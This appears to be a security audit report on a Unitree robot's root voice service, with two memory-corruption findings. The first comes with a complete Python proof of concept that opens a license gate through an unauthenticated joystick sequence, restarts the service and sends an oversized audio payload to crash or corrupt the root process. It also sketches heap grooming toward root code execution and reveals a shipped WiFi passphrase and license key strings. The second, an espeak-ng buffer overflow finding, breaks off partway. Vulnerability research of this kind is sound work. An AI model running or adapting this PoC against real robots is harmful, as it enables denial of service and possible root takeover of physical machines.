The vui_service restart via 293 `rt/api/robot_state/request` api 1001 `RPCServiceSwitch` (`{"name","switch"}` from 294 `ServiceSwitchParameter::fromJson@0x50de54`) is the same restart primitive already used by the 295 E2 PoC. 296 * Not executed here: the DDS publish, the joystick sequence and the live crash (no robot in the 297 audit lab). 298

file.content: # Finding: AUD-vui-voice1003-limiter-heapoverflow ## Primitive Memory Corruption — **unauthenticated attacker-controlled heap buffer overflow (arbitrary length + arbitrary content) in the root `vui_service` process**, via the DDS `rt/api/voice/request` api 1003 audio-stream `binary` payload. ## Severity HIGH (remote root heap write primitive with fully attacker-controlled length and bytes; downgradeable to "latent" only by the per-unit VQE-license gate — see Condition Analysis; on units where the rkap 3A license is active the primitive is directly live) ## Condition Analysis ### Summary `vui_service` runs as root and registers `handler_voice` (`vui_service@0x16e3d4`) for the unauthenticated DDS topic `rt/api/voice/request` (subscription wired at `vui_service@0x170ddc` dds_init → `voice_subscriber`, topic string `rt/api/voice/request` at `vui_service@0x11cce88`). For `api_id == 1003` (TTS/audio-stream upload, the API the companion app uses to push audio to the robot — `webrtc_bridge.LOG:5404` registers `rt/api/voice/request` as a WebRTC data-channel publisher, so this is fully remote-reachable through the established MQTT→WebRTC chain), the handler takes the raw DDS `Request_::binary` field (an unbounded `sequence`; no CycloneDDS `MaxSampleSize` override in `etc/cyclonedds.xml`), converts it wholesale to `std::vector` via `convertBinaryToInt16` (`vui_service@0x16bd98` — verified: reserve(size/2), push_back loop, no cap), and passes the entire vector to `limiter_proc` (`vui_service@0x2923d8` wrapper → `uni::Audio_algorithm::limiter_proc` `vui_service@0x167074`). Inside `Audio_algorithm::limiter_proc`, a function-local-static `std::vector buffer` is allocated **once** with `mic_buffer_size` = **80000 shorts** (160,000 bytes; `mic_buffer_size = 80000` hardcoded at `vui_service@0x131cbc` in `uni::Alsa::init`), and then every call executes: ``` for ( i = 0; input.size() > i; ++i ) buffer[left_len + i] = input[i]; // vui_service@0x1671A4–0x167208 ``` with **no comparison of `input.size()` (or `left_len + input.size()`) against `buffer.size()`** — verified at the disassembly level: the loop at `0x1671a8–0x167208` compares `i` only against the input size loaded at `0x16715c` (`std::vector::size(input)`), then computes `&buffer[i + left_len]` via the **unchecked** `std::vector::operator[]` (`0x1671e8–0x1671f0`) and stores the attacker's int16 (`STRH W19, [X0]` at `0x1671f8`). `std::vector::operator[]` performs no bounds check in release libstdc++. The attacker therefore chooses both the overflow **length** (any `binary` payload > 160,000 bytes ⇒ > 80,000 samples overflows; multi-MB DDS samples are deliverable — the SDK's own audio-streaming feature relies on this) and the overflow **content** (every overflowed int16 is a verbatim byte pair from the DDS payload, little-endian). The only guard on the path is an early return `if (!audioLoopDown_shared_ptr) { "audioLoopDown is NULL"; return 0; }` (`vui_service@0x16716c–0x1671a0`) — the `audioProcessDown::IAudioLoopDown` shared_ptr is created exclusively in the auth-SUCCESS branch of `uni::Audio_algorithm::init` (`vui_service@0x165dbc`), i.e. when the Rockchip rkap "audio3a" license check passes (`auth_proc` `vui_service@0x16694c`: returns success if `/data/key.lic` exists — "this dev has auth" — or if `lic_active` is set and `rkauth_tool_get_licence("audio3a","unitree_audio","ai0ywc47eoGn",...)` succeeds). The shipped unit's log shows `license not active!!` / `auth_proc Failed` (`module/vui_service/vui_log.txt` line 17-18), so on THAT unit the gate is closed; on every unit with an activated 3A license (`/data/key.lic` present, persisted across reboots) the shared_ptr is non-null and the overflow is live from a single DDS publish. ### Pre-conditions - `vui_service` running as root (`etc/master_service/service/vui_service`, start-stop-daemon, no user switch). - Attacker can publish to DDS topic `rt/api/voice/request` (domain 0): satisfied by any firmware-image holder (DDS CA + cert + private key shipped in `etc/ds/`, Authentication-only DDS-Security, no AccessControl), by any WiFi-AP/LAN peer (AP passphrase `4bf6a3d48831` shipped), or via the WebRTC data channel (`webrtc_bridge.LOG:5404` — `registerPublisher() topicName=rt/api/voice/request`) combined with the MQTT→WebRTC chain. **UPDATE 2026-08-20 (field test, broker ACL): the INTERNET leg is broker-gated — a live test showed publish to `cmd/` is silently dropped at robot-mqtt.unitree.com, blocking the remote `webrtcConnectRequest` entry. LAN/WiFi-AP DDS remains unconditional; the remote leg reopens on broker-ACL bypass or cloud-credential compromise.** - The message must parse as JSON with a `stream_id` field (`cJSON_GetObjectItem(v82,"stream_id")` — any value) and `api_id == 1003`. - **License gate**: `audioProcessDown::IAudioLoopDown` shared_ptr non-null, i.e. rkap 3A license active on the unit (`/data/key.lic` present, or `lic_active:1` + successful cloud license fetch). **CORRECTED at review (2026-08-20): the audited unit's OWN log shows the gate was subsequently OPENED on that unit** — `vui_log.txt` line 104-106 (2026-07-02 14:16): the unauthenticated DDS keys==55 sequence ("Key L1 + L2 + R1 + R2 + start", `handler_joystick@0x16fed8` → `byte_190ECE2=1` @0x170290) set `lic_active:1` → "license have active!!"; after the 14:17:27 restart: "rkauth_tool_get_licence successful total_num:16105 used_num:14085" → "VQE algorithm" → "AudioPost_InitByPath successfull" → "test_rkap_3a Done" — i.e. `Audio_algorithm::init`'s auth-SUCCESS branch ran and constructed `audioLoopDown` (createAudioLoopDown@0x166044), so the overflow is LIVE (not latent) on the audited unit from 14:17:28 onward. `/data/key.lic` persists across reboots once activated; the initial-boot "license not active!!" lines (25-26, not 17-18 as originally cited) reflect only the pre-activation state. - Can an unauthenticated user meet all pre-conditions? **Yes** for the DDS publish itself (no auth anywhere in the handler — `header.lease`/`policy` never read); the license gate is a device-state condition, not an attacker-facing control. ### Data Flow 1. Attacker publishes `Request_` on `rt/api/voice/request` with `header.identity.api_id = 1003`, `parameter = '{"stream_id":"x","app_name":"gpt"}'`, and `binary` = arbitrary bytes of length L > 160000. Application: `handler_voice` (`vui_service@0x16e3d4`, api-1003 branch at the `(char*)&elf_gnu_hash_indexes[33]+3` compare) parses `parameter` with cJSON. 2. Attacker includes `"stream_id"` (any string) — the ONLY field required to enter the audio path. Application: `std::string::operator=(v94, stream_id)` then `v85 = Request_::binary(a1)`. 3. Attacker's `binary` (L bytes) is converted wholesale: `convertBinaryToInt16(v93, v85)` (`vui_service@0x169a38` call site) — alignment check only, no size cap. 4. `limiter_proc(v93, v91)` (`vui_service@0x169a38` → wrapper `0x2923d8` copies the vector → `uni::Audio_algorithm::limiter_proc(&ap, copy, out)`). Application: gate check `audioLoopDown` non-null (`vui_service@0x16716c`) — on licensed units passes. 5. The copy loop writes `buffer[left_len + i] = input[i]` for i < L/2 into the 80,000-short static heap vector (`vui_service@0x1671a4–0x167208`). Application: with L/2 = e.g. 200,000 samples, offsets 80,000..199,999 are **120,000 shorts (240,000 bytes) past the end of the 160,000-byte heap allocation** — arbitrary attacker bytes written into adjacent heap/mmap memory of the root process; smaller overshoots corrupt the allocator region; large overshoots reliably SIGSEGV (root service crash-loop). 6. Repeat at will: the handler processes every incoming sample; `left_len` (residual < 160) merely shifts the start offset. ### Taint Trace ``` Source: Request_.binary (unbounded sequence) at vui_service@0x16e3d4 (handler_voice api-1003 branch) — type: DDS message field, topic rt/api/voice/request (unauth; remote via webrtc_bridge publisher, LOG:5404) ↓ convertBinaryToInt16 at vui_service@0x16bd98 — transformation: byte pairs → int16 vector, NO length cap Guard: parity check only ("Data size is not aligned") — effective: NO (size cap absent) ↓ limiter_proc wrapper vui_service@0x2923d8 (vector copy) Guard: audioLoopDown shared_ptr non-null at vui_service@0x16716c — checks: rkap 3A license state — effective: YES on unlicensed units (early return), NO on licensed units → Sink: buffer[left_len + i] = input[i] at vui_service@0x1671a4–0x167208 — EFFECT: IO (heap OOB write, attacker length + content) — verdict: UNBOUNDED Vulnerability class: Memory Corruption (heap buffer overflow, remote unauth, root process) ``` ### Guard Assessment | # | Guard | Location | What It Checks | Effective? | Why/Why Not | |---|-------|----------|---------------|------------|-------------| | 1 | `audioLoopDown is NULL` early return | `vui_service@0x16716c` | rkap 3A license initialized | PARTIAL | closes the path on unlicensed units (audited unit: closed, `vui_log.txt` "license not active!!"); `/data/key.lic` persists once activated, reopening the path permanently; not an input-validation control | | 2 | DDS-Security Authentication | `etc/cyclonedds.xml` | peer identity | NO | CA + device cert + private key all ship in firmware (`etc/ds/`); no AccessControl plugin | | 3 | `binary` alignment check | `vui_service@0x16bd98` | size % 2 == 0 | NO (for overflow) | rejects odd sizes only | | 4 | (hypothetical) upstream sample-size cap | CycloneDDS config | — | ABSENT | no `MaxSampleSize` in `etc/cyclonedds.xml`; default allows multi-MB fragmented samples (the app's own music-streaming feature depends on large binaries) | | 5 | vector bounds | `std::vector::operator[]` `vui_service@0x1671f0` | nothing (release libstdc++, no `_GLIBCXX_ASSERTIONS`) | NO | the only bounds this loop could use is `buffer.size()` (80,000) and it is never consulted | ### Impact - **Arbitrary-length, arbitrary-content heap write in a root process**, remotely reachable (LAN/WiFi-AP direct DDS; fully remote via the established MQTT→WebRTC→DDS bridge chain, `webrtc_bridge.LOG:5404`). - Minimum guaranteed impact on any licensed unit: **remote root service crash / crash-loop DoS** (large overshoot into unmapped pages → SIGSEGV; vui_service is restarted by master_service). - With heap-grooming (the 160,000-byte static vector is a large allocation likely served by mmap; glibc's dynamic `M_MMAP_THRESHOLD` rises after large free/realloc churn in this long-running process, making brk-arena placement plausible): **control-flow hijack → root RCE**. The overflow runs on the CycloneDDS listener thread inside a process that also runs `system()` call sites (e.g. `FSM1_run` state 10) — a corruptible target set. - Content control is total (verbatim payload bytes), so heap metadata (chunk size fields, freelist pointers) can be forged precisely. - Caveat honestly stated: on the audited unit the license gate is closed; the primitive is live on units with activated rkap audio-3A (a paid/licensed voice feature), and the gate itself is flipped by device state (`/data/key.lic` existence), not by anything the attacker must authenticate to. ### Chain to root `rt/api/voice/request` api 1003 (unauth DDS, remote via WebRTC bridge) → `handler_voice` → `convertBinaryToInt16` → `Audio_algorithm::limiter_proc` static-buffer unbounded copy → root heap overflow → (a) reliable crash = remote unauth DoS of the voice subsystem; (b) heap-groom → RIP control in root process → direct root RCE, no further primitive needed. Independently composes with AUD-audiodetect-03 (same process, already-spawned root listener) for post-exploitation convenience. ### Origin - **Group**: m3-vui-mem (binary RE, wave M3) - **Files**: `module/vui_service/bin/vui_service` (handler_voice@0x16e3d4, convertBinaryToInt16@0x16bd98, limiter_proc wrapper@0x2923d8, Audio_algorithm::limiter_proc@0x167074, Alsa::init mic_buffer_size@0x131cbc, Audio_algorithm::init@0x165dbc, auth_proc@0x16694c) - **Sink catalog reference**: `audit/sinks/m3-vui-mem.md` → Seed Sinks row 1 ### Confidence 8 — the unbounded copy loop is verified at disassembly level (no bound anywhere between the DDS payload and the `STRH` into the fixed 80,000-short vector); the api-1003 dispatch and topic wiring are decompiled and cross-checked against the shipped webrtc_bridge log; the single residual uncertainty is the fraction of fielded units with an active rkap 3A license (gate closed on the audited unit's log — documented, not assumed away). ## Review: PASSED - Taint trace verified: yes — full chain independently re-decompiled: `handler_voice@0x16e3d4` api-1003 branch (`v53 == &elf_gnu_hash_indexes[33]+3`): cJSON `"stream_id"` (only required field, 0x16e8a0) → `Request_::binary(a1)` @0x16e8f0 → `convertBinaryToInt16` @0x16e908 → `limiter_proc` @0x16e918 → wrapper `0x2923d8` (vector copy) → `uni::Audio_algorithm::limiter_proc@0x167074`. Inside: function-local-static `buffer` (guard @0x17add68, object @0x17add50) constructed ONCE with `mic_buffer_size` shorts (0x167104→0x167124); copy loop `for (i=0; v18>i; ++i) buffer[left_len+i] = input[i]` at **0x1671a4–0x1671f8** with `v18 = input.size()` loaded at 0x167160 — `i` is compared ONLY against the input size; `left_len + input.size()` is NEVER compared against `buffer.size()`. `std::vector::operator[]` (call at 0x1671f0, store at 0x1671f8) is unchecked in release libstdc++. Unbounded copy confirmed. - Primitive verified: `mic_buffer_size = 80000` is hardcoded — `ADRL X0, mic_buffer_size` @0x131cbc / **`MOV W1, #0x13880` (80000) @0x131cc4** / `STR W1,[X0]` @0x131ccc in `uni::Alsa::init` — so the static vector is 80,000 shorts (160,000 bytes) and any `binary` payload > 160,000 bytes overflows it with verbatim attacker byte pairs. `convertBinaryToInt16@0x16bd98` verified: parity check (throws only on odd size), `reserve(size/2)`, push_back loop, **no cap**. - License-gate semantics verified: `uni::Audio_algorithm::init@0x165dbc` — `auth_proc` failure → "auth_proc Failed" + `system("rm /data/key.lic")` (0x165e38); success → … → **`audioProcessDown::createAudioLoopDown` @0x166044 + `shared_ptr::operator=(this+8)` @0x166054** — the ONLY construction of `audioLoopDown`. `auth_proc@0x16694c` verified: `/data/key.lic` ifstream @0x166a14 → "this dev has auth" → return 0; else `lic_active` (byte_190ECE2) → `rkauth_tool_get_licence("audio3a","unitree_audio","ai0ywc47eoGn",...)` @0x166c08; else "license not active!!" → -1. `limiter_proc`'s null-gate at 0x167178 ("audioLoopDown is NULL" @0x167198 → return 0) therefore closes the path only while the unit is unlicensed. Severity confirmed: HIGH. - **Correction (strengthens the finding): the audited unit's gate was subsequently OPEN.** The finding's caveat "on the audited unit the license gate is closed" (citing `vui_log.txt` "line 17-18" — actually lines 25-26, 2026-07-02 10:55 boot) is refuted by the SAME log: line 104 `Key L1 + L2 + R1 + R2 + start` (the unauthenticated DDS keys==55 sequence, `handler_joystick@0x16fed8` → `byte_190ECE2=1` @0x170290) → line 105 `lic_active:1` → line 106 `license have active!!`; after the 14:17:27 restart: line 136 `rkauth_tool_get_licence successful total_num:16105 used_num:14085`, then `VQE algorithm` / `AudioPost_InitByPath successfull` / `test_rkap_3a Done` — i.e. the auth-SUCCESS branch of `Audio_algorithm::init` RAN on this unit, `audioLoopDown` was constructed, and the api-1003 overflow is LIVE (not latent) on the audited unit from 14:17:28 onward. The license gate is a one-time, unauthenticated-DDS-flippable device-state bit (`/data/key.lic` persists), not an attacker-facing control. - Reachability classification (per 2026-08-20 field test, broker-ACL): LAN/WiFi-AP DDS publish to `rt/api/voice/request` = **unconditional** (shipped CA/cert/key, no AccessControl). The "fully remote via MQTT→WebRTC" leg is **broker-gated**: live test showed publish to `cmd/` is silently dropped at robot-mqtt.unitree.com, blocking the remote offer-injection entry; `rt/api/voice/request` is WebRTC-registered (webrtc_bridge.LOG:5404 re-verified verbatim: `registerPublisher() topicName=rt/api/voice/request`) so the chain reopens with any cloud-credential compromise or broker-ACL bypass. The finding's Pre-conditions/Impact should carry this caveat rather than the unconditional "fully remote" phrasing. ## Independent Verification - Source cited: handler_voice@0x16e3d4, convertBinaryToInt16@0x16bd98, limiter_proc wrapper@0x2923d8, Audio_algorithm::limiter_proc@0x167074, loop 0x1671a4–0x167208, Alsa::init mic_buffer_size@0x131cbc, Audio_algorithm::init@0x165dbc, auth_proc@0x16694c, webrtc_bridge.LOG:5404 - I independently re-read (NOT cited by source): - `MOV W1,#0x13880` @0x131cc4 + `STR` @0x131ccc (found via xref_query on mic_buffer_size@0x17adc8c → write site in Alsa::init, then disasm) — the 80000 constant as an immediate, proving the vector size is compile-time-fixed. - `createAudioLoopDown` call @0x166044 and `std::shared_ptr::operator=` @0x166054 (found via full decompile of Audio_algorithm::init) — proves audioLoopDown exists ONLY in the auth-success branch. - auth_proc's `std::ifstream("/data/key.lic")` @0x166a14 and `rkauth_tool_get_licence` call @0x166c08 with the exact license strings (found via decompile of auth_proc). - vui_log.txt lines 104-106 and 136 (found via `grep -a 'licen' vui_log.txt`) — license activation evidence on the audited unit; also fixes the source's line-number citation (25-26, not 17-18). - The 160-sample chunking loop after the copy (`(left_len+size)/160` @0x167228, per-160 callback via vtable+16 @0x16728c) — found in the limiter_proc decompile; confirms `left_len` is a residual < 160 that only shifts the overflow start offset, as claimed. - Verdict basis: independent re-derivation at instruction level, plus runtime log evidence the source agent did not consult. ## PoC **Scope statement (honest):** crash PoC + trigger construction. Demonstrated: the exact api-1003 DDS message (an oversized `binary` field), the deterministic multi-megabyte heap overwrite past the fixed 80,000-short static vector, and the **attacker-openable license gate** (an unauthenticated DDS joystick sequence + a service restart — observed already open on the audited unit). Heap-groomed RIP control is not attempted. **Reachability framing:** `rt/api/voice/request` is an unauthenticated DDS topic; a direct publish from the robot's eth0 LAN (192.168.123.0/24) is the unconditional entry (the WebRTC/MQTT remote leg is broker-gated and is not used). The license gate is a **device-state condition, not an authentication control**: the flag it reads is flipped by the unauthenticated `rt/wirelesscontroller` topic. ### Reproduction ```bash pip3 install cyclonedds cp /etc/ds/*.crt . && cp /lib/libdds_security_auth.so . # DDS identity from the image # Target: vui_service running as root (default service), no other configuration. ``` ### Strategy Publish a `Request_` on `rt/api/voice/request` with `header.identity.api_id = 1003`, `parameter = '{"stream_id":"x"}'` (`stream_id` is the **only** field the handler requires) and `binary` = arbitrary bytes. `handler_voice@0x16e3d4` api-1003 branch → `Request_::binary` → `convertBinaryToInt16@0x16bd98` (parity check only, `reserve(size/2)`, no cap) → wrapper `0x2923d8` → `uni::Audio_algorithm::limiter_proc@0x167074`. Inside, a function-local-static `std::vector buffer` is constructed **once** with `mic_buffer_size = 80000` (`MOV W1,#0x13880` @0x131cc4 in `uni::Alsa::init`) = 160,000 bytes, and every call runs `for (i = 0; input.size() > i; ++i) buffer[left_len + i] = input[i];` (0x1671a4-0x167208, `STRH W19,[X0]` @0x1671f8) — `i` is compared **only** against the input size, never against `buffer.size()`, and `std::vector::operator[]` is unchecked in release libstdc++. So the attacker chooses the overflow length (any `binary` > 160,000 bytes) and the content verbatim little-endian int16 pairs. `left_len` is a residual < 160 that only shifts the start. **License gate — how an unauthenticated attacker opens it** (and why it was already open on the audited unit): 1. `rt/wirelesscontroller` `WirelessController_` with `keys = 55` (bitmask L1=2 + L2=32 + R1=1 + R2=16 + start=4), **sent twice** (`handler_joystick@0x16fed8` fires on two consecutive equal samples) → `vui_data = 9`, `byte_190ECE2 = 1` (`lic_active`), `vui_log.txt` line `license have active!!`, and `lic_active:1` is persisted to `/unitree/etc/vui/setting.json`. 2. Restart `vui_service` (e.g. `rt/api/robot_state/request` api 1001 `RPCServiceSwitch` `{"name":"vui_service","switch":0}` then `{"switch":1}`) → `Audio_algorithm::init` takes the `lic_active` branch → `rkauth_tool_get_licence("audio3a","unitree_audio","ai0ywc47eoGn",…)` → on success writes `/data/key.lic` → `createAudioLoopDown@0x166044` constructs the shared_ptr → **the gate is open permanently** (`/data/key.lic` survives reboots). 3. This exact sequence is recorded in the shipped `module/vui_service/vui_log.txt` lines 104-106 (`Key L1 + L2 + R1 + R2 + start` → `lic_active:1` → `license have active!!`) and line 136 (`rkauth_tool_get_licence successful total_num:16105 used_num:14085` → `VQE algorithm` → `AudioPost_InitByPath successfull` → `test_rkap_3a Done`) — i.e. the audited unit's own log proves the gate was open on it from 2026-07-02 14:17:28 onward. ### Prerequisites - LAN adjacency to eth0 + firmware image. - A unit with the rkap audio3a license active (either already activated, or opened with the 2-message sequence above). On unactivated units the copy is skipped (`audioLoopDown is NULL`, `vui_service@0x167198`) and there is no overflow. ### Complete code (`poc_vui_limiter_heapoverflow.py`) ```python #!/usr/bin/env python3 """PoC — AUD-vui-voice1003-limiter-heapoverflow: oversized api-1003 `binary` -> buffer[left_len+i] = input[i] into a fixed 80,000-short static heap vector (no bounds check).""" import argparse, json, os, time TOPIC, RSTATE_TOPIC, STICK_TOPIC = "rt/api/voice/request", "rt/api/robot_state/request", "rt/wirelesscontroller" MIC_BUFFER_SHORTS = 80000 # MOV W1,#0x13880 @ uni::Alsa::init MIC_BUFFER_BYTES = MIC_BUFFER_SHORTS * 2 # 160,000 def request(api_id: int, parameter: dict, binary: bytes = b"\x00"): from unitree_api.msg.dds_ import (Request_, RequestHeader_, RequestIdentity_, RequestLease_, RequestPolicy_) return Request_(header=RequestHeader_( identity=RequestIdentity_(id=int(time.time_ns() & 0x7FFFFFFF), api_id=api_id), lease=RequestLease_(0), policy=RequestPolicy_(1, True)), parameter=json.dumps(parameter), binary=list(binary)) def limiter_model(payload: bytes, left_len: int = 0) -> dict: """Faithful model of limiter_proc@0x167074's copy loop (release libstdc++ operator[]).""" samples = len(payload) // 2 # convertBinaryToInt16: size/2 shorts oob = max(0, left_len + samples - MIC_BUFFER_SHORTS) return {"payload_bytes": len(payload), "samples": samples, "bytes_written": 2 * samples, "oob_shorts": oob, "oob_bytes": 2 * oob} def participants(a): os.environ["CYCLONEDDS_URI"] = ( '' 'false' '' 'file:%s' 'file:%s' 'file:%s' % (a.iface, os.path.abspath(a.dds_lib), os.path.abspath(a.ca), os.path.abspath(a.cert), os.path.abspath(a.key))) from cyclonedds.domain import DomainParticipant from cyclonedds.topic import Topic from cyclonedds.pub import DataWriter from cyclonedds.core import Qos, Policy from cyclonedds.util import duration # superset QoS (the shipped mock_sender.py recipe): matches any reader whose QoS is weaker qos = Qos(Policy.Reliability.Reliable(duration(microseconds=60)), Policy.Deadline(duration(microseconds=1000)), Policy.Durability.TransientLocal, Policy.History.KeepLast(10)) dp = DomainParticipant(0) return (DataWriter(dp, Topic(dp, TOPIC, __import__( "unitree_api.msg.dds_", fromlist=["Request_"]).Request_, qos=qos)), DataWriter(dp, Topic(dp, RSTATE_TOPIC, __import__( "unitree_api.msg.dds_", fromlist=["Request_"]).Request_)), DataWriter(dp, Topic(dp, STICK_TOPIC, __import__( "unitree_go.msg.dds_", fromlist=["WirelessController_"]).WirelessController_))) def open_license_gate(w_voice, w_state, w_stick) -> None: """keys=55 (L1+L2+R1+R2+start) twice -> lic_active=1, then restart vui_service.""" from unitree_go.msg.dds_ import WirelessController_ for _ in range(2): # handler_joystick needs 2 equal samples w_stick.write(WirelessController_(lx=0.0, ly=0.0, rx=0.0, ry=0.0, keys=55)) time.sleep(0.05) for sw in (0, 1): # RPCServiceSwitch: stop then start w_state.write(request(1001, {"name": "vui_service", "switch": sw})) time.sleep(3.0) print("[+] license gate sequence sent (keys=55 x2 -> lic_active=1 -> vui_service restart " "-> rkauth_tool_get_licence -> /data/key.lic -> audioLoopDown constructed)") if __name__ == "__main__": ap = argparse.ArgumentParser() ap.add_argument("--dds-lib"); ap.add_argument("--ca"); ap.add_argument("--cert") ap.add_argument("--key"); ap.add_argument("--iface", default="eth0") ap.add_argument("--size", type=int, default=8 * 1024 * 1024, help="binary payload size (default 8 MiB -> ~8.2 MB past the allocation)") ap.add_argument("--open-gate", action="store_true", help="send the keys=55 + vui_service restart sequence first") ap.add_argument("--selftest", action="store_true") a = ap.parse_args() m = limiter_model(b"\x00" * a.size) print("[*] binary = %d bytes -> %d int16 samples copied into the 80,000-short static vector " "-> %d shorts (%d bytes) written PAST the 160,000-byte allocation" % (m["payload_bytes"], m["samples"], m["oob_shorts"], m["oob_bytes"])) if a.selftest: assert limiter_model(b"\x00" * 160000)["oob_shorts"] == 0 assert limiter_model(b"\x00" * 160002)["oob_shorts"] == 1 assert m["oob_bytes"] == 2 * (a.size // 2 - MIC_BUFFER_SHORTS) print("[+] selftest OK: 160,000 bytes is the exact in-bounds bound; every pair beyond " "it is one OOB short; 8 MiB -> %d bytes past the end" % m["oob_bytes"]) else: w_voice, w_state, w_stick = participants(a) if a.open_gate: open_license_gate(w_voice, w_state, w_stick) # 0x4141 int16 pattern: verbatim attacker bytes, deterministic SIGSEGV on unmapped pages w_voice.write(request(1003, {"stream_id": "aud", "app_name": "gpt"}, binary=(b"\x41\x41" * (a.size // 2)))) print("[+] api-1003 published to rt/api/voice/request (stream_id present, %d-byte binary)" % a.size) ``` ### Usage ```bash python3 poc_vui_limiter_heapoverflow.py --selftest # gate closed: open it first with the unauthenticated joystick sequence, then fire: python3 poc_vui_limiter_heapoverflow.py ... --open-gate ``` ### Expected output ``` [*] binary = 8388608 bytes -> 4194304 int16 samples copied into the 80,000-short static vector -> 4114304 shorts (8228608 bytes) written PAST the 160,000-byte allocation [+] api-1003 published to rt/api/voice/request (stream_id present, 8388608-byte binary) ``` Robot-side crash signature: `vui_service` SIGSEGVs inside `limiter_proc@0x167074` — `dmesg` / `journalctl -k`: `vui_service[...]: unhandled level 2 translation fault` at an address ~8 MB above the 160,000-byte static vector (an 8 MB linear overshoot cannot stay inside mapped heap, so the crash is deterministic, not probabilistic). `master_service.LOG` shows the vui_service restart; repeating the publish produces a crash-loop DoS of the voice subsystem. On an unlicensed unit nothing happens (`audioLoopDown is NULL` @0x167198 in `vui_log.txt`) — that log line is the explicit tell that the gate is closed. ### Exploitation outline (not executed — honest boundary) Content control is total (verbatim payload byte pairs, little-endian), so heap metadata — chunk size fields and freelist pointers — can be forged precisely. The 160,000-byte static vector is a large allocation: at first use it is above glibc's mmap threshold, but the dynamic `M_MMAP_THRESHOLD` rises after large free/realloc churn in this long-running process, making brk-arena placement plausible after the service has been up. Mitigations: vui_service is PIE + Full RELRO + NX + canary, none of which protect a heap `operator[]`; no canary is crossed. Weaponization needs heap grooming plus an address leak, and note the overflow runs on the CycloneDDS listener thread of a process that also runs `system()` call sites (`FSM1_run` state 10) — out of scope here. ### Verification performed for this PoC (offline, this session) * Bounds arithmetic re-derived from the verified anchors: `mic_buffer_size = 80000` (`MOV W1,#0x13880` @0x131cc4), unchecked `buffer[left_len+i] = input[i]` at 0x1671a4-0x167208, `convertBinaryToInt16` parity-check-only — asserted by `--selftest` (160,000 bytes = exact in-bounds bound). * License-gate opener re-derived from the shipped evidence: `handler_joystick@0x16fed8` keys==55 → `byte_190ECE2 = 1` @0x170290 (`lic_active`), two-consecutive-sample debounce, persisted to `/unitree/etc/vui/setting.json` (mod-006), then `Audio_algorithm::init@0x165dbc` auth-success branch → `createAudioLoopDown@0x166044` + `shared_ptr::operator=` @0x166054; the audited unit's `vui_log.txt:104-106,136` records the whole sequence. The vui_service restart via `rt/api/robot_state/request` api 1001 `RPCServiceSwitch` (`{"name","switch"}` from `ServiceSwitchParameter::fromJson@0x50de54`) is the same restart primitive already used by the E2 PoC. * Not executed here: the DDS publish, the joystick sequence and the live crash (no robot in the audit lab).

1	# Finding: AUD-espeak-punctlist-bss-overflow
2	
3	## Primitive
4	Memory Corruption — unauthenticated remote global (.bss) buffer overflow with attacker-controlled length and partially-controlled 4-byte values in a ROOT process (vendored espeak-ng CVE-2023-49993, unfixed 1.52.0.1 fork).
5	
6	## Severity
7	CRITICAL
8	
9	## Condition Analysis
10	
11	### Summary
12	vui_service (33.8MB root process) vendors espeak-ng 1.52.0.1 (sherpa-onnx's pinned `csukuangfj/espeak-ng@ed530aa1` fork, which predates the Dec-2023 upstream CVE fixes) and feeds it **raw attacker-controlled text** on the EN TTS path. The api 1001 handler on DDS topic `rt/api/voice/request` (unauthenticated; WebRTC-registered publisher topic per `var/log/webrtc_bridge/webrtc_bridge.LOG:5404`, i.e. reachable via the established MQTT→robot_state→WebRTC→DDS remote chain) parses `{"index","uid","speaker_id","text"}` with **no length, content, language, or license validation** (`handler_voice@0x16e3d4`, api-1001 branch). With `speaker_id != 0` the EN piper model is selected (`uni::TTS::generate@0x2ac3ac`, `LDR X5,[X0,#0xE0]` at vui_service@0x2ac47c — EN instance built at `uni::TTS::TTS@0x2ac26c` with `/unitree/module/vui_module/tts/en/espeak-ng-data`), and the text flows verbatim: `readSegments@0x16e074` (splits at commas, **max 500 bytes per segment**) → `messageQueue` → `thread_tts@0x29429c` → `TTS::generate` → `SherpaOnnxOfflineTtsGenerateWithCallbackWithArg@0x2bc1d0` → `OfflineTtsVitsImpl::Generate@0x393920` → `PiperPhonemizeLexicon::ConvertTextToTokenIdsVits@0x3a3938` → `CallPhonemizeEspeak@0x3a3010` (mutex-guarded) → `piper::phonemize_eSpeak@0x5118f8` → **`espeak_TextToPhonemesWithTerminator@0x519488`** → `TranslateClauseWithTerminator@0x53a318` → **`ReadClause@0x529508`**.
13	
14	Inside ReadClause, the espeak-ng *embedded command* `\x01` (CTRL_EMBEDDED = 0x01, fork `translate.h:37`) + `'B'` path (NOT gated on SSML mode — fork `readclause.c:645-675`, vendored dispatch at vui_service@0x5297e4-0x5297f8) copies a whitespace-terminated punctuation-character list into the fixed global `wchar_t option_punctlist[60]` (`option_punctlist@0x192b000`, 240 bytes):
15	
16	```c
17	j = 0;
18	while (!Eof() && !iswspace(c2)) {      // fork readclause.c:667 — NO "j < N_PUNCTLIST-1" bound
19	    option_punctlist[j++] = c2;        // fork readclause.c:668 — CVE-2023-49993 (ASAN line match)
20	    c2 = GetC();
21	    buf[ix++] = ' ';
22	}
23	option_punctlist[j] = 0;
24	```
25	
26	Vendored loop at vui_service@0x52a2f8-0x52a36c — writes `STR W27, [X26,X21,LSL#2]` (0x52a318) and `STR W27, [X25,X21,LSL#2]` (0x52a36c) with **no bound on j anywhere** (loop exits only on Eof/iswspace); terminator write `STR WZR,[X2,W23,SXTW#2]` at 0x52a43c is likewise out-of-bounds. The upstream fix (commit `1a7ecfc2f2`, "readclause: limit embedded punctlist length") adds `&& (j < N_PUNCTLIST-1)` — absent here. Each non-space character of the attacker text after `\x01B<non-0/1 char>` writes one attacker-chosen Unicode codepoint (≤0x10FFFF, e.g. any ASCII) as a 4-byte wchar at `option_punctlist[j]`, sequentially and unbounded → **up to ~496 consecutive 4-byte writes (~1.9KB) starting at 0x192b000 in the root process's .bss, no stack canary in the way**.
27	
28	### Pre-conditions
29	- Attacker can publish a DDS sample to `rt/api/voice/request` — TRUE for any LAN/WiFi-AP peer (fleet-wide pattern: no auth/lease/token anywhere in the Python or DDS layer, `etc/cyclonedds.xml` ships CA/cert but no AccessControl) and for the WebRTC data channel, `rt/api/voice/request` being a bridge-registered publisher topic (`webrtc_bridge.LOG:5404`; live app traffic at LOG:6587/6591). **UPDATE 2026-08-20 (field test, broker ACL): the INTERNET leg is broker-gated — a live test with a forged SN-derived credential showed publish to `cmd/<SN>` is silently dropped at robot-mqtt.unitree.com, blocking the remote `webrtcConnectRequest` offer-injection entry. Fully-remote reopens only on broker-ACL bypass / topic-normalization trick / cloud-credential compromise; LAN DDS remains unconditional.**
